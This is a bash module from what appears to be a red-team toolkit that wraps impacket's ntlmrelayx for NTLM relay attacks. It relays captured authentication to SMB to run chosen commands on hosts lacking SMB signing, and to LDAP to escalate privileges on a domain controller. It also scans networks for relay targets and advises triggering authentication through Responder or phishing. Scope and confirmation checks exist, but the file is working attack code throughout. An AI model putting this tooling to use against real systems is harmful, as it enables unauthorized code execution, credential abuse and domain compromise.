#!/bin/bash
# NTLM Relay attacks via laptop (impacket-ntlmrelayx)

rt_ntlm_relay() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "NTLM Relay requires laptop mode"
    LOG "Enable in: Configure > Toggle Laptop Mode"
    return 1
  fi
  
  if ! laptop_ping; then
    LOG red "Cannot reach laptop at $LAPTOP_HOST"
    return 1
  fi
  
  local choice
  choice=$(menu_pick "NTLM Relay" \
    "Relay to SMB (get shells)" \
    "Relay to LDAP (add user)" \
    "Relay to HTTP (WebDAV)" \
    "Generate Target List" \
    "Stop Relay" \
    "View Captured Sessions")
  
  case "$choice" in
    1) relay_smb ;;
    2) relay_ldap ;;
    3) relay_http ;;
    4) relay_targets ;;
    5) relay_stop ;;
    6) relay_view ;;
    0|"") return ;;
  esac
}

relay_smb() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - relay blocked"
    return 1
  fi
  
  if ! confirm_danger "Start SMB relay? This will attempt code execution on targets without SMB signing."; then
    return 1
  fi
  
  local targets
  targets=$(TEXT_PICKER "Targets file (on laptop)" "$LAPTOP_RESULTS_DIR/targets.txt")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local command
  command=$(TEXT_PICKER "Command to execute" "whoami")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting NTLM relay to SMB targets..."
  LOG "Targets: $targets"
  LOG "Command: $command"
  
  local log_file="$LAPTOP_RESULTS_DIR/ntlmrelay_smb_$(date +%Y%m%d_%H%M%S).log"
  
  # Use impacket-ntlmrelayx
  laptop_exec_bg "ntlmrelayx.py -tf '$targets' -c '$command' -smb2support" "$log_file"
  
  LOG green "NTLM relay started"
  LOG ""
  LOG "Now trigger authentication (e.g., via Responder, phishing, etc.)"
  LOG "Successful relays will execute: $command"
  LOG ""
  LOG "Log file: $log_file"
  LOG "Stop with: NTLM Relay > Stop Relay"
}

relay_ldap() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - relay blocked"
    return 1
  fi
  
  if ! confirm_danger "Start LDAP relay? This may modify Active Directory."; then
    return 1
  fi
  
  local dc_ip
  dc_ip=$(IP_PICKER "Domain Controller IP" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$dc_ip"; then
    LOG red "Target $dc_ip not in scope ($TARGET_NETWORK)"
    return 1
  fi
  
  LOG blue "Starting NTLM relay to LDAP..."
  LOG "DC: $dc_ip"
  
  local log_file="$LAPTOP_RESULTS_DIR/ntlmrelay_ldap_$(date +%Y%m%d_%H%M%S).log"
  
  # LDAP relay - attempts to add a new computer account or escalate
  laptop_exec_bg "ntlmrelayx.py -t ldap://$dc_ip --escalate-user" "$log_file"
  
  LOG green "LDAP relay started"
  LOG ""
  LOG "If successful, will attempt privilege escalation"
  LOG "Log file: $log_file"
}

relay_http() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - relay blocked"
    return 1
  fi
  
  if ! confirm_danger "Start HTTP/WebDAV relay?"; then
    return 1
  fi
  
  local target
  target=$(TEXT_PICKER "Target URL" "http://target/webdav/")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting NTLM relay to HTTP..."
  
  local log_file="$LAPTOP_RESULTS_DIR/ntlmrelay_http_$(date +%Y%m%d_%H%M%S).log"
  
  laptop_exec_bg "ntlmrelayx.py -t '$target' --http-port 80" "$log_file"
  
  LOG green "HTTP relay started"
  LOG "Log file: $log_file"
}

relay_targets() {
  LOG blue "Generating target list (hosts without SMB signing)..."
  
  local network
  network=$(TEXT_PICKER "Network to scan" "$TARGET_NETWORK")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local output="$LAPTOP_RESULTS_DIR/targets.txt"
  
  LOG "Scanning for SMB signing status..."
  
  # CrackMapExec or nmap to find hosts without SMB signing
  laptop_exec "crackmapexec smb '$network' --gen-relay-list '$output' 2>/dev/null || nmap -p445 --script smb-security-mode '$network' -oG - | grep 'message_signing: disabled' | awk '{print \$2}' > '$output'"
  
  local count
  count=$(laptop_exec "wc -l < '$output' 2>/dev/null || echo 0")
  
  LOG green "Found $count potential relay targets"
  LOG "Saved to: $output"
  
  # Show first few
  LOG ""
  LOG "First 10 targets:"
  laptop_exec "head -10 '$output'" 2>/dev/null || true
}

relay_stop() {
  LOG blue "Stopping NTLM relay on laptop..."
  
  laptop_exec "pkill -f 'ntlmrelayx' || true"
  
  LOG green "Relay stopped"
}

relay_view() {
  LOG blue "NTLM Relay session logs:"
  LOG ""
  
  laptop_exec "ls -la $LAPTOP_RESULTS_DIR/ntlmrelay*.log 2>/dev/null" || LOG "(no relay logs)"
  
  LOG ""
  LOG "Recent relay activity:"
  laptop_exec "tail -30 $LAPTOP_RESULTS_DIR/ntlmrelay*.log 2>/dev/null | head -30" || true
  
  LOG ""
  LOG "Successful relays are marked with [+] in logs"
}
